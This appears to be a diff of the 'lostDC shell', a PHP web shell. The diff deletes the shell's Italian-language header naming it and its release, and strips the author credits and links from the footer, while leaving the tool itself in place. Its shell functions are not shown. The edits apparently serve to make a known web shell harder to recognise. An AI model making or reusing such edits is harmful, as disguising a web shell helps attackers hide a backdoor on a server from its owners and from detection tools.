@@ -1,14 +1,6 @@
  <?php
 
-/* *
- * 
- * lostDC shell
- * PHP Shell scritta 
- * Rilasciata sotto licenza GPL 2009/2010
- * Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)
- * La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento
- * 
- * */
+
 
 if (!function_exists("getTime")) {
     function getTime() {
@@ -470,6 +462,6 @@ print "<table id = \"foot\">
             </td>
            </tr>
        </table><hr size=\"1\" width=\"60%\" noshade />\n</hr>";
-    print "<center>[ Generation time: ".round(getTime()-startTime,4)." seconds | by <a href=\"http://lostpassword.hellospace.net\">lostpassword</a> and <a href = \"http://www.d3vilc0de.org\">D3vilc0de crew</a> ]</center>\n</body>\n</html>";
+    print "<center>[ Generation time: ".round(getTime()-startTime,4)." seconds | </a> ]</center>\n</body>\n</html>";
 
 ?> 
